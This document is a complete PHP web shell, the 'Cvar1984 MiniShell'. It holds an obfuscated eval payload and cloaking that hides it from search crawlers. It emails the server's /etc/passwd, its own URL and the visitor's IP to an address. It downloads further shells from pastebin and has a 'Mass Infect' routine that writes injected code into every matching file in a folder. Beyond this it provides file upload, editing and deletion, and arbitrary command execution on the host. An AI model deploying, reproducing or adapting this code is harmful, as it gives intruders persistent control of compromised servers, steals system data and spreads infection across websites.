<?php
eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents=array("
    Googlebot",
    "Slurp",
    "MSNBot",
    "PycURL",
    "facebookexternalhit",
    "ia_archiver",
    "crawler",
    "Yandex",
    "Rambler",
    "Yahoo! Slurp",
    "YahooSeeker",
    "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />";
function mail_alert() {
global $email;
$passwd=file_get_contents('/etc/passwd');
$shell_path="http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$subject="Logs";
$from="From:Cvar1984";
$content_mail="URL : $shell_path\nIP : ".$_SERVER['REMOTE_ADDR'] ."\n**********\n$passwd\n**********\nBy Cvar1984";
mail($email,$subject,$content_mail,$from);
}
if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
        if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
           
print '<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
            if ($email != "") {
                mail_alert();
            }
        }else {
            if($_POST['usrname']) {
                print'<script>alert("Wrong Username or password");</script>';
            }
            echo '
<h1>Permission Denied</h1>
<p>You don t have permission to access the this page.</p>
<form method="post">

<input class="hidden" type="password" size="30" name="passwrd" value="" onfocus="if (this.value == \'password\')
this.value = \'\';">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<input type="hidden" size="30" name="usrname" value="Cvar1984" onfocus="if (this.value == \'username\'){this.value = \'\';}">
</form>';
exit;
}
}
@session_start();
@ini_set('max_execution_time',0);
@ini_set('memory_limit','999999999M');
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ignore_user_abort(FALSE);
@set_time_limit(0);
@error_reporting(4);
if(strtolower(substr(PHP_OS,0,3)) == "win") {
    $os="win";
    $ox="Windows";
    $sep="\\";
}else {
    $os="nix";
    $ox="Linux";
    $sep="/";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$user = $uid['name'];
}

$self=$_SERVER['PHP_SELF'];
$server_sofware=$_SERVER['SERVER_SOFTWARE'];
$ip_lu=$_SERVER['REMOTE_ADDR'];
$ip_server=$_SERVER['SERVER_ADDR'];
$admin=$_SERVER['SERVER_ADMIN'];
$hostname=gethostbyname($_SERVER['HTTP_HOST']);
echo '
<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="http://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css" />
<style type="text/css">
body{
    font-family:"Orbitron";
    background-color:#E7E7E7;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color:#104E8B;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px silver dotted;
}
H1{
    font-family: "Orbitron", cursive;
}
a{
    color:#303030;
    text-decoration: none;
}
a:hover{
    color:#104E8B;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #104E8B solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center>Cvar1984 MiniShell</center></H1>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
echo "
<table>
<tr><td><a href=\"?cgi\">CGI Telnet</a></td></tr>
<tr><td><a href=\"?b374k\">B374K</a></td></tr>
<tr><td><a href=\"?adminer\">Adminer</a></td></tr>
<tr><td><a href=\"?phpinfo\">PHP Info</a></td></tr>
<tr><td><a href=\"?path={$path}&massinfect\">Mass Infect</a></td></tr>
<tr><td><a href=\"?killme\">Self Remove</a></td></tr>
</table>";
if(isset($_REQUEST["phpinfo"])) {
phpinfo();
}
elseif(isset($_REQUEST["cgi"])) {
	$cgi_dir=mkdir('cgi', 0755);
	$file_cgi="cgi/cgi.izo";
	$isi_htcgi="AddHandler cgi-script .izo";
	$htcgi=fopen(".htaccess", "w");
	$cgi_script=file_get_contents("https://pastebin.com/raw/MUD0EPjb");
	$cgi=fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	if(file_exists("cgi/cgi.izo")) {
	header("location:cgi/cgi.izo");
}else {
echo "<script>alert('Failed');</script>";
}
}
elseif(isset($_REQUEST["b374k"])) {
$nama=fopen("jembud2.php", "w");
$file=file_get_contents('https://pastebin.com/raw/nCqVmtBu');
fwrite($nama, $file);
chmod($nama, 0444);
fclose($nama);
if(file_exists("jembud2.php")) {
header("location:jembud2.php");
}else {
echo "<script>alert('Failed');</script>";
}
}
elseif(isset($_REQUEST["adminer"])) {
$nama=fopen("adminer.php", "w");
$file=file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
fwrite($nama, $file);
fclose($nama);
if(file_exists("adminer.php")) {
header("location:adminer.php");
}else {
echo "<script>alert('Failed');</script>";
}
}
elseif(isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
	chdir($_GET['path']);
    global $sep;
    $mode=$_POST['modexxx'];
    $ftype=$_POST['ffttype'];
    $c_cont=$_POST['code_cont'];
    $ppp=$_POST['path'];
    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode!="" && $ftype!="" && $c_cont!="" && $ppp!="") {
        echo "<center><h2>Mass Infect Successfully</h2></center><table>";
        switch($mode) {
            case "Apender":
                $mmode="a";
                break;
            case "Rewrite":
                $mmode="w";
                break;
        }if($handle = opendir($ppp)) {
            while(($c_file = readdir($handle)) !== False) {
                if((preg_match("/$ftype".'$'.'/', $c_file , $matches) != 0) && (preg_match('/'.$c_file.'$/', $self , $matches) != 1)) {
                    echo "<tr><td><font
color=red>$ppp$sep$c_file</font></td></tr>";
                    $fd = fopen($ppp.$sep.$c_file,$mmode);
                    if($fd) {
                        fwrite($fd,$c_cont);
                    }else {
                        alert("Error. Access Denied");
                    }
                }
            }
        }
        echo "</table><br><br><hr><br><br></div>";
    }else {
    ?>
<center><h2>Mass Infect</h2></center><hr><br><br><table><form method='POST'>
<input type='hidden' name='path' value="<?php echo getcwd();
?>"><tr><td>Mode : </td>
<td><select name='modexxx'>
<option>Rewrite</option>
<option>Apender</option>
</select></td></tr>
<tr><td>File Type</td><td>
<input name='ffttype' value='html' size=50></td></tr>
<tr><td>Content : </td>
<td><textarea name='code_cont' style='width:383px;height:400px'></textarea></td></tr>
<tr><td></td>
<td><input type=submit value='Go' /></td></tr></form></table><br><br><hr><br><br>
    <?php
    }
}
elseif(isset($_REQUEST['killme'])) {
    global $self;
    $me=basename($self);
    unlink($me);
    echo "<script>alert('Have Nice Day');</script>";
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
echo '
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>PWD : ';
foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="lime">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<b><br>'.php_uname().'<br></b>';
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="lime">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="lime">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="lime">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="lime">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="lime">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="lime">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="lime">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
	echo "
	<center><form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$hostname.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form></center>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
         (($perms & 0x0800) ? 's' : 'x' ) :
         (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
         (($perms & 0x0400) ? 's' : 'x' ) :
         (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
         (($perms & 0x0200) ? 't' : 'x' ) :
         (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>